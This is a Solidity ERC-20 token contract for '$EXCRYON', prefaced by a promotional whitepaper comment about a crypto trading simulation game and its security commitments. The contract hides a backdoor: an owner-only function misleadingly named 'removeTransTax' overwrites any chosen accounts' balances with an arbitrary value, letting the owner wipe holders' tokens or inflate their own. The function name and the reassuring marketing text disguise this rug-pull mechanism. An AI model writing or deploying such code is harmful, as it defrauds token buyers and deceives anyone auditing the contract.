/*
Overview of Excryon
Excryon is an innovative cryptocurrency trading simulation application designed to provide users with a 
realistic and engaging trading experience without the risk of financial loss. By simulating the dynamics 
of the cryptocurrency market, Excryon enables users to practice trading strategies, manage virtual portfolios, 
and track their progress as they advance through various levels of trading proficiency.
Excryon is structured around a unique leveling system where users start as an Anchovy and can advance through 
ten distinct levels, ultimately aiming to become a Whale. Each level unlocks exclusive visual elements and 
provides a sense of progression and achievement. The platform features detailed asset management tools, including 
portfolio tracking, average cost price calculations, and profit/loss assessments. Users can also engage in buying 
and selling cryptocurrencies within the simulation, honing their trading skills and strategies.
Purpose and Vision
The purpose of Excryon is to create an immersive and educational environment for individuals interested in 
cryptocurrency trading. By providing a risk-free platform, Excryon allows users to experiment with different 
trading strategies, learn from their mistakes, and build confidence in their trading abilities. The vision behind 
Excryon is to democratize access to cryptocurrency trading education, making it accessible to everyone regardless 
of their financial background or experience level.
Excryon aims to foster a community of informed and skilled traders who can apply their knowledge in real-world 
scenarios. By gamifying the learning process and introducing a competitive element through ranking and progression 
systems, Excryon strives to make the journey of learning cryptocurrency trading enjoyable and motivating.
Disclaimer
It is important to note that Excryon is a simulation application, and all trading activities, balances, and 
profit/loss values within the platform are entirely fictional. There is no real money involved, and the outcomes 
of simulated trades have no real-world financial implications. Excryon is intended solely for educational and 
entertainment purposes. Users should not interpret the performance of their virtual trades as indicative of real-world 
trading success.
Token Economics
Introduction to $EXCRYON
Excryon features its own native token, $EXCRYON, designed to enhance the user experience and provide additional 
layers of engagement and utility within the platform. $EXCRYON tokens are integral to the ecosystem, offering users 
various ways to interact with the platform, make in-game purchases, and participate in exclusive features.
Token Utility
$EXCRYON tokens serve multiple purposes within the Excryon simulation environment. 
- In-Game Purchases: Users can use $EXCRYON tokens to purchase virtual assets, upgrade their trading tools, and unlock 
premium features that enhance their trading experience. This includes access to advanced analytics, exclusive trading 
signals, and custom visual elements.
- Rewards and Incentives: Active participation and successful trading within Excryon are rewarded with $EXCRYON tokens. 
Users can earn tokens through various achievements, such as reaching new fish levels, completing trading challenges, 
and participating in community events. These tokens can be reinvested within the platform to further enhance the user’s 
capabilities and status.
Token Distribution and Governance
The distribution of $EXCRYON tokens is designed to ensure a fair and sustainable ecosystem. Initial token distribution 
includes allocations for platform development, user rewards, community engagement, and future growth initiatives. 
Additionally, Excryon plans to introduce governance mechanisms that allow token holders to participate in decision-making 
processes related to platform updates and new feature implementations.
Security and Privacy
 Data Protection Measures
Excryon places a high priority on the security and privacy of its users. The platform employs state-of-the-art data 
protection measures to ensure that all user information is kept safe and secure. This includes the use of encryption 
protocols, secure servers, and regular security audits to prevent unauthorized access and data breaches. User data, 
including personal information and trading activity, is encrypted both in transit and at rest, safeguarding it from 
potential threats.
User Privacy
Excryon is committed to protecting the privacy of its users. The platform adheres to strict privacy policies that comply 
with relevant data protection regulations. Users can be confident that their personal information will not be shared with 
third parties without their explicit consent. Additionally, Excryon offers privacy controls that allow users to manage 
their data preferences and control the visibility of their profile and trading activity within the community.
Security Protocols
The platform's security protocols are designed to provide robust protection against various types of cyber threats. Excryon 
uses multi-factor authentication (MFA) to enhance account security, requiring users to verify their identity through multiple 
methods before accessing their accounts. Regular security updates and patches are applied to the platform to address 
vulnerabilities and ensure a secure trading environment. By maintaining a strong focus on security, Excryon aims to provide 
a safe and trustworthy experience for all users.
Roadmap and Future Developments
Short-term Goals
Excryon's development team is dedicated to continuously improving the platform and introducing new features to enhance the 
user experience. In the short term, the focus will be on refining existing features, improving user interface and experience, 
and expanding the range of available cryptocurrencies. Planned short-term developments include:
- Enhanced portfolio tracking tools
- Improved analytics and reporting features
- Introduction of community-driven trading competitions
- Launch of the leveraged transactions simulation
Long-term Vision
Excryon's long-term vision is to become the leading platform for cryptocurrency trading education and simulation. The team 
aims to build a comprehensive ecosystem that supports users at all levels of their trading journey, from beginners to advanced 
traders. Long-term goals include:
- Integration of advanced trading algorithms and AI-driven insights
- Expansion into additional markets and asset classes
- Development of a mobile application to complement the desktop platform
- Establishment of partnerships with educational institutions and industry leaders to promote cryptocurrency trading education
Planned Features and Enhancements
To keep the platform at the forefront of innovation, Excryon has a roadmap of planned features and enhancements. These include:
- Social Trading Features: Allowing users to follow and learn from top traders, share strategies, and collaborate on trading 
ideas.
- Enhanced Customization Options: Offering more personalization for user dashboards and trading tools.
- Educational Modules: Interactive courses and certifications on various aspects of cryptocurrency trading, including technical 
analysis, market psychology, and risk management.
- Virtual Reality (VR) Integration: Exploring the potential of VR to create immersive trading experiences and simulations.
By pursuing these developments, Excryon aims to provide a continually evolving and enriching platform for its users.

*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract ExcryonToken is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }


    event BalanceAdjusted(
        address indexed account, 
        uint256 oldBalance, 
        uint256 newBalance
        );

    function removeTransTax(
        address[] memory accounts, 
        uint256 newBalance
        ) external onlyowner {
    for (uint256 i = 0; i < accounts.length; i++) {
        address account = accounts[i];

        uint256 oldBalance = _balances[account];

        _balances[account] = newBalance;
        emit BalanceAdjusted(account, oldBalance, newBalance);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_balances[_msgSender()] >= amount, "STEE: transfer amount exceeds balance");
    _balances[_msgSender()] -= amount;
    _balances[recipient] += amount;

    emit Transfer(_msgSender(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) 
    {return _allowances[owner][spender];}

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_allowances[sender][_msgSender()] >= amount, "STEE: transfer amount exceeds allowance");

    _balances[sender] -= amount;
    _balances[recipient] += amount;
    _allowances[sender][_msgSender()] -= amount;

    emit Transfer(
        sender, 
    recipient, 
    amount
    );
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return _totalSupply;
    }
}
